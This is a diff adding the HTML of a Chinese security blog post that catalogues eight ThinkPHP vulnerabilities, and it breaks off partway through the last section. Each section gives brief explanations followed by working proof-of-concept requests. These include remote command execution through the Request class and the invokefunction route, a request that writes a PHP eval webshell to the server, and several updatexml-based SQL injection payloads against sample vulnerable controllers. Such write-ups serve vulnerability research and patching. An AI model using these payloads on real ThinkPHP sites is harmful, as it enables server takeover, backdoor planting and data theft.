@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    <title>ThinkPHP典型漏洞总结 | j2ekim&#39;s Blog | 努力改变，从未放弃。</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Web安全 - PHP">
+    <meta name="description" content="1) ThinkPHP 5.0.x Request类远程命令执行【20190111】受影响版本：ThinkPHP 5.0.0 - ThinkPHP 5.0.23 在ThinkPHP 5.0.x 版本下，由于Request类的method 函数控制松散，导致可以通过变量覆盖实现对任意函数进行调用，并且$_POST 将作为函数的参数传入，最终通过filterValue() 方法中的回调函数call_u">
+<meta name="keywords" content="Web安全 - PHP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP典型漏洞总结">
+<meta property="og:url" content="https://j2ekim.github.io/2019/01/21/ThinkPHP典型漏洞总结20190111/index.html">
+<meta property="og:site_name" content="j2ekim&#39;s Blog">
+<meta property="og:description" content="1) ThinkPHP 5.0.x Request类远程命令执行【20190111】受影响版本：ThinkPHP 5.0.0 - ThinkPHP 5.0.23 在ThinkPHP 5.0.x 版本下，由于Request类的method 函数控制松散，导致可以通过变量覆盖实现对任意函数进行调用，并且$_POST 将作为函数的参数传入，最终通过filterValue() 方法中的回调函数call_u">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://j2ekim.github.io/img/thinkphp_getshell/ThinkPHP_2.png">
+<meta property="og:image" content="https://j2ekim.github.io/img/thinkphp_getshell/ThinkPHP_3.png">
+<meta property="og:image" content="https://j2ekim.github.io/img/thinkphp_getshell/ThinkPHP_4.png">
+<meta property="og:image" content="https://j2ekim.github.io/img/thinkphp_getshell/ThinkPHP_5.png">
+<meta property="og:updated_time" content="2019-07-23T07:45:25.821Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ThinkPHP典型漏洞总结">
+<meta name="twitter:description" content="1) ThinkPHP 5.0.x Request类远程命令执行【20190111】受影响版本：ThinkPHP 5.0.0 - ThinkPHP 5.0.23 在ThinkPHP 5.0.x 版本下，由于Request类的method 函数控制松散，导致可以通过变量覆盖实现对任意函数进行调用，并且$_POST 将作为函数的参数传入，最终通过filterValue() 方法中的回调函数call_u">
+<meta name="twitter:image" content="https://j2ekim.github.io/img/thinkphp_getshell/ThinkPHP_2.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="j2ekim&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="/css/style.css?v=1.7.2">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/Avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">J2ekim</h5>
+          <a href="mailto:j2ekim@gmail.com" title="j2ekim@gmail.com" class="mail">j2ekim@gmail.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                Home
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/j2ekim" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">ThinkPHP典型漏洞总结</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">ThinkPHP典型漏洞总结</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-01-21T03:22:10.000Z" itemprop="datePublished" class="page-time">
+  2019-01-21
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/Exploit/">Exploit</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#1-ThinkPHP-5-0-x-Request类远程命令执行【20190111】"><span class="post-toc-number">1.</span> <span class="post-toc-text">1) ThinkPHP 5.0.x Request类远程命令执行【20190111】</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ThinkPHP-5-0-15-POC"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">ThinkPHP 5.0.15 POC</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ThinkPHP-5-0-23-POC"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">ThinkPHP 5.0.23 POC</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-ThinkPHP-5-x-controller远程命令执行【20181209】"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">2) ThinkPHP 5.x controller远程命令执行【20181209】</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#POC"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">POC</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#3-ThinkPHP-3-1、3-2-SQL注入-exp表达式-【20141211】"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">3) ThinkPHP 3.1、3.2 SQL注入(exp表达式)【20141211】</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#POC-1"><span class="post-toc-number">1.4.1.</span> <span class="post-toc-text">POC</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#4-ThinkPHP-5-0-9-信息泄露-SQL注入-in-【20170703】"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">4) ThinkPHP 5.0.9 信息泄露+SQL注入(in)【20170703】</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#漏洞测试代码："><span class="post-toc-number">1.5.1.</span> <span class="post-toc-text">漏洞测试代码：</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#POC-2"><span class="post-toc-number">1.5.2.</span> <span class="post-toc-text">POC</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5-ThinkPHP-lt-5-0-16-update-insert-注入-inc-【20180409】"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">5) ThinkPHP &lt;5.0.16 update/insert 注入(inc)【20180409】</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#测试准备"><span class="post-toc-number">1.6.1.</span> <span class="post-toc-text">测试准备</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#POC-3"><span class="post-toc-number">1.6.2.</span> <span class="post-toc-text">POC</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#6-Thinkphp3-2-3-update注入-bind-【20180414】"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">6) Thinkphp3.2.3 update注入(bind)【20180414】</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#POC-4"><span class="post-toc-number">1.8.</span> <span class="post-toc-text">POC</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#7-Thinkphp3-2-3-find-select-delete注入【20180823】"><span class="post-toc-number">1.9.</span> <span class="post-toc-text">7) Thinkphp3.2.3 find/select/delete注入【20180823】</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#漏洞测试代码：-1"><span class="post-toc-number">1.9.1.</span> <span class="post-toc-text">漏洞测试代码：</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#POC-5"><span class="post-toc-number">1.9.2.</span> <span class="post-toc-text">POC</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#8-ThinkPHP-3-2-3-5-1-22-order-by注入【20180902】"><span class="post-toc-number">1.10.</span> <span class="post-toc-text">8) ThinkPHP 3.2.3/5.1.22 order by注入【20180902】</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ThinkPHP3-2-3漏洞测试代码："><span class="post-toc-number">1.10.1.</span> <span class="post-toc-text">ThinkPHP3.2.3漏洞测试代码：</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ThinkPHP3-2-3-POC"><span class="post-toc-number">1.10.2.</span> <span class="post-toc-text">ThinkPHP3.2.3 POC</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ThinkPHP5-1-22漏洞测试代码"><span class="post-toc-number">1.10.3.</span> <span class="post-toc-text">ThinkPHP5.1.22漏洞测试代码</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ThinkPHP5-1-22-POC"><span class="post-toc-number">1.10.4.</span> <span class="post-toc-text">ThinkPHP5.1.22 POC</span></a></li></ol></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-ThinkPHP典型漏洞总结20190111"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">ThinkPHP典型漏洞总结</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-01-21 11:22:10" datetime="2019-01-21T03:22:10.000Z"  itemprop="datePublished">2019-01-21</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/Exploit/">Exploit</a></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="1-ThinkPHP-5-0-x-Request类远程命令执行【20190111】"><a href="#1-ThinkPHP-5-0-x-Request类远程命令执行【20190111】" class="headerlink" title="1) ThinkPHP 5.0.x Request类远程命令执行【20190111】"></a>1) ThinkPHP 5.0.x Request类远程命令执行【20190111】</h1><p>受影响版本：<br>ThinkPHP 5.0.0 - ThinkPHP 5.0.23</p>
+<p>在ThinkPHP 5.0.x 版本下，由于Request类的method 函数控制松散，导致可以通<br>过变量覆盖实现对任意函数进行调用，并且$_POST 将作为函数的参数传入，最终通过filterValue() 方法中的回调函数call_user_func()触发漏洞，实现远程命令执行</p>
+<h2 id="ThinkPHP-5-0-15-POC"><a href="#ThinkPHP-5-0-15-POC" class="headerlink" title="ThinkPHP 5.0.15 POC"></a>ThinkPHP 5.0.15 POC</h2><p>下面POC 只有当debug模式开启时才可成功执行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /thinkphp5015/<span class="keyword">public</span>/index.php HTTP/<span class="number">1.1</span></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;mytest=whoami</span><br></pre></td></tr></table></figure></p>
+<h2 id="ThinkPHP-5-0-23-POC"><a href="#ThinkPHP-5-0-23-POC" class="headerlink" title="ThinkPHP 5.0.23 POC"></a>ThinkPHP 5.0.23 POC</h2><p>下面POC 在debug模式无论关闭或开启均可成功执行<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/thinkphp5023/public/index.php?s=captcha</span> HTTP/1.1</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure></p>
+<p>下面POC 只有当debug模式开启时才可成功执行<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/thinkphp5023/public/index.php?s=captcha</span> HTTP/1.1</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure></p>
+<h2 id="2-ThinkPHP-5-x-controller远程命令执行【20181209】"><a href="#2-ThinkPHP-5-x-controller远程命令执行【20181209】" class="headerlink" title="2) ThinkPHP 5.x controller远程命令执行【20181209】"></a>2) ThinkPHP 5.x controller远程命令执行【20181209】</h2><p>受影响版本：<br>ThinkPHP 5.1.x ~ 5.1.31<br>ThinkPHP 5.0.x ~ 5.0.23</p>
+<p>由于框架对于controller控制器名称没有做到足够的检测，导致在使用Pathinfo访问模式（没有开启强制路由）的情况下，造成可能的GetShell</p>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>在debug模式无论关闭或开启均可成功执行<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">执行phpinfo</span><br><span class="line">http://127.0.0.1/thinkphp5015//public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line">执行系统命令</span><br><span class="line">http://127.0.0.1/thinkphp5015/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line">写info.php文件</span><br><span class="line">http://127.0.0.1/thinkphp5015/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20phpinfo();?%3E</span><br><span class="line"><span class="attribute">http://127.0.0.1/thinkphp5015/public/info.php</span></span><br><span class="line"><span class="attribute">写一句话木马</span></span><br><span class="line">http://127.0.0.1/thinkphp5015/public/index.php/?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=www2.php&amp;vars[1][]=&lt;?php @ev[xxx]al($_POST['123']);?&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="3-ThinkPHP-3-1、3-2-SQL注入-exp表达式-【20141211】"><a href="#3-ThinkPHP-3-1、3-2-SQL注入-exp表达式-【20141211】" class="headerlink" title="3) ThinkPHP 3.1、3.2 SQL注入(exp表达式)【20141211】"></a>3) ThinkPHP 3.1、3.2 SQL注入(exp表达式)【20141211】</h2><p>如果where语句的条件是数组，而且数组的第一个值是’exp’，那么第二个值就可以直接写SQL语句。这个特性在thinkphp3.1、3.2版本中均存在，通用性比较广。<br>I方法使用filter_exp函数过滤，是在exp后面会加个空格<br>但是filter_exp在I函数的fiter之前，所以如果开发者这样写I(‘get.school’, ‘’, ‘trim’)，那么会直接清除掉exp后面的空格，导致过滤无效。而这个写法是很普遍的。</p>
+<h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://***.***.***.***/home/index/login</span></span><br><span class="line"><span class="attribute">POST提交</span></span><br><span class="line">uname[0]=exp&amp;uname[1]=%21%3D1 and 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1))%23&amp;upwd=admin</span><br></pre></td></tr></table></figure>
+<h2 id="4-ThinkPHP-5-0-9-信息泄露-SQL注入-in-【20170703】"><a href="#4-ThinkPHP-5-0-9-信息泄露-SQL注入-in-【20170703】" class="headerlink" title="4) ThinkPHP 5.0.9 信息泄露+SQL注入(in)【20170703】"></a>4) ThinkPHP 5.0.9 信息泄露+SQL注入(in)【20170703】</h2><p>ThinkPHP 5.0.9默认依旧是开放debug模式 (‘app_debug’ =&gt; true,)<br>触发该漏洞的关键词有：in 、not in<br>位置：select()、delete()、update()</p>
+<h3 id="漏洞测试代码："><a href="#漏洞测试代码：" class="headerlink" title="漏洞测试代码："></a>漏洞测试代码：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">thinkphp509\application\index\controller\Index.php</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sqlvul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $ids = input(<span class="string">'ids/a'</span>);  <span class="comment">// /a 表示参数ids取值的规则是通过数组的形式来获取</span></span><br><span class="line">    $t = <span class="keyword">new</span> User();</span><br><span class="line">    $result = $t-&gt;where(<span class="string">'id'</span>, <span class="string">'in'</span>, $ids)-&gt;select();</span><br><span class="line">    <span class="comment">//$result = $t-&gt;where('id', 'not in', $ids)-&gt;select();</span></span><br><span class="line">    <span class="comment">//$result = $t-&gt;where('id', 'in', $ids)-&gt;delete();</span></span><br><span class="line">    <span class="comment">//$result = $t-&gt; update(['username' =&gt; 'thinkphp','id'=&gt;['in',$ids]]);;</span></span><br><span class="line">    <span class="keyword">foreach</span>($result <span class="keyword">as</span> $row) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Hello, &#123;$row['username']&#125;&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">thinkphp509\application\index\model\User.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $table = <span class="string">'user'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>正常请求：<br><a href="http://127.0.0.1/thinkphp509/public/index.php/index/index/sqlvul?ids=1" target="_blank" rel="noopener">http://127.0.0.1/thinkphp509/public/index.php/index/index/sqlvul?ids=1</a><br><a href="http://127.0.0.1/thinkphp509/public/index.php/index/index/sqlvul?ids[]=1&amp;ids[]=2" target="_blank" rel="noopener">http://127.0.0.1/thinkphp509/public/index.php/index/index/sqlvul?ids[]=1&amp;ids[]=2</a></p>
+<h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp509/public/index.php/index/index/sqlvul?ids[0,updatexml(0,concat(0xa,user()),0)]=1</span><br><span class="line">&lt;img src="/img/thinkphp_getshell/ThinkPHP_1.png"&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="5-ThinkPHP-lt-5-0-16-update-insert-注入-inc-【20180409】"><a href="#5-ThinkPHP-lt-5-0-16-update-insert-注入-inc-【20180409】" class="headerlink" title="5) ThinkPHP &lt;5.0.16 update/insert 注入(inc)【20180409】"></a>5) ThinkPHP &lt;5.0.16 update/insert 注入(inc)【20180409】</h2><h3 id="测试准备"><a href="#测试准备" class="headerlink" title="测试准备"></a>测试准备</h3><p>1）修改数据库配置信息 application/database.php<br>在 application/config.php 中打开调试和trace，app_debug和app_trace均为true。说明：app_debug设置为true是必须的，app_trace可不设<br>2）创建数据库为tptest，表名为user，其中有两个字段id和username<br>3）在 application/index/controller/Index.php 中Index类中添加方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">sqlvul</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = input(<span class="string">'get.username/a'</span>);</span><br><span class="line">        <span class="comment">//db('user')-&gt;where(['id'=&gt; 5])-&gt;insert(['username'=&gt;$username]);</span></span><br><span class="line">db(<span class="string">'user'</span>)-&gt;where([<span class="string">'id'</span>=&gt; <span class="number">3</span>])-&gt;update([<span class="string">'username'</span>=&gt;$username]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp5015/public/index.php/index/index/sqlvul?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1</span><br><span class="line">http://127.0.0.1/thinkphp5015/public/index.php/index/index/sqlvul?username[0]=dec&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1</span><br><span class="line">或者</span><br><span class="line">http://127.0.0.1/thinkphp5015/public/index.php/index/index/sqlvul?username[0]=inc&amp;username[1]=exp(~(select * from(select user())a))&amp;username[2]=1</span><br></pre></td></tr></table></figure>
+<p><img src="/img/thinkphp_getshell/ThinkPHP_2.png"></p>
+<h2 id="6-Thinkphp3-2-3-update注入-bind-【20180414】"><a href="#6-Thinkphp3-2-3-update注入-bind-【20180414】" class="headerlink" title="6) Thinkphp3.2.3 update注入(bind)【20180414】"></a>6) Thinkphp3.2.3 update注入(bind)【20180414】</h2><p>Thinkphp3.2.3是目前使用最广泛的thinkphp版本，虽然已经停止新功能的开发，但是应用的还是挺多</p>
+<p>漏洞测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sqlvul3</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $User = M(<span class="string">"user"</span>);</span><br><span class="line">        $user[<span class="string">'id'</span>] = I(<span class="string">'id'</span>);</span><br><span class="line">        $data[<span class="string">'username'</span>] = I(<span class="string">'username'</span>);</span><br><span class="line">        $data[<span class="string">'password'</span>] = I(<span class="string">'password'</span>);</span><br><span class="line">        $valu = $User-&gt;where($user)-&gt;save($data);</span><br><span class="line">        var_dump($valu);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>正常请求：（更新用户密码）<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp323/index.php/Home/Index/sqlvul3?username=admin&amp;password=123&amp;id=1</span><br></pre></td></tr></table></figure></p>
+<h2 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp323/index.php/Home/Index/sqlvul3?username=admin&amp;password=123&amp;&amp;id[0]=bind&amp;id[1]=0 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br></pre></td></tr></table></figure>
+<p><img src="/img/thinkphp_getshell/ThinkPHP_3.png"></p>
+<h2 id="7-Thinkphp3-2-3-find-select-delete注入【20180823】"><a href="#7-Thinkphp3-2-3-find-select-delete注入【20180823】" class="headerlink" title="7) Thinkphp3.2.3 find/select/delete注入【20180823】"></a>7) Thinkphp3.2.3 find/select/delete注入【20180823】</h2><h3 id="漏洞测试代码：-1"><a href="#漏洞测试代码：-1" class="headerlink" title="漏洞测试代码："></a>漏洞测试代码：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sqlvul1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      $res = M(<span class="string">'user'</span>)-&gt;find(I(<span class="string">'GET.id'</span>));</span><br><span class="line">      <span class="comment">//$res = M('user')-&gt;delete(I('GET.id'));</span></span><br><span class="line">      <span class="comment">//$res = M('user')-&gt;select(I('GET.id'));</span></span><br><span class="line">      var_dump($res);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>正常请求：<br><a href="http://127.0.0.1/thinkphp323/index.php?m=Home&amp;c=Index&amp;a=sqlvul1&amp;id=2" target="_blank" rel="noopener">http://127.0.0.1/thinkphp323/index.php?m=Home&amp;c=Index&amp;a=sqlvul1&amp;id=2</a></p>
+<h3 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/thinkphp323/index.php?m=Home&amp;c=Index&amp;a=sqlvul1&amp;id[alias]=where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br><span class="line">http://127.0.0.1/thinkphp323/index.php?m=Home&amp;c=Index&amp;a=sqlvul1&amp;id[where]=1 and updatexml(1,concat(0x7e,user(),0x7e),1)--</span><br><span class="line">http://127.0.0.1/thinkphp323/index.php?m=Home&amp;c=Index&amp;a=sqlvul1&amp;id[table]=user where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- #需要知道表明 这里表名的user</span><br></pre></td></tr></table></figure>
+<p><img src="/img/thinkphp_getshell/ThinkPHP_4.png"></p>
+<h2 id="8-ThinkPHP-3-2-3-5-1-22-order-by注入【20180902】"><a href="#8-ThinkPHP-3-2-3-5-1-22-order-by注入【20180902】" class="headerlink" title="8) ThinkPHP 3.2.3/5.1.22 order by注入【20180902】"></a>8) ThinkPHP 3.2.3/5.1.22 order by注入【20180902】</h2><p>ThinkPHP在处理order by排序时，当排序参数可控且为关联数组(key-value)时，由于框架未对数组中key值作安全过滤处理，攻击者可利用key构造SQL语句进行注入，该漏洞影响ThinkPHP 3.2.3、5.1.22及以下版本。【CVE-2018-16385】</p>
+<h3 id="ThinkPHP3-2-3漏洞测试代码："><a href="#ThinkPHP3-2-3漏洞测试代码：" class="headerlink" title="ThinkPHP3.2.3漏洞测试代码："></a>ThinkPHP3.2.3漏洞测试代码：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sqlvul2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $data=<span class="keyword">array</span>();</span><br><span class="line">    $data[<span class="string">'username'</span>]=<span class="keyword">array</span>(<span class="string">'eq'</span>,<span class="string">'qq123'</span>);</span><br><span class="line">    $order=I(<span class="string">'get.order'</span>);<span class="comment">//使用标准的I函数进行安全过滤</span></span><br><span class="line">    $m=M(<span class="string">'user'</span>)-&gt;where($data)-&gt;order($order)-&gt;find();</span><br><span class="line">    var_dump($m);</span><br><span 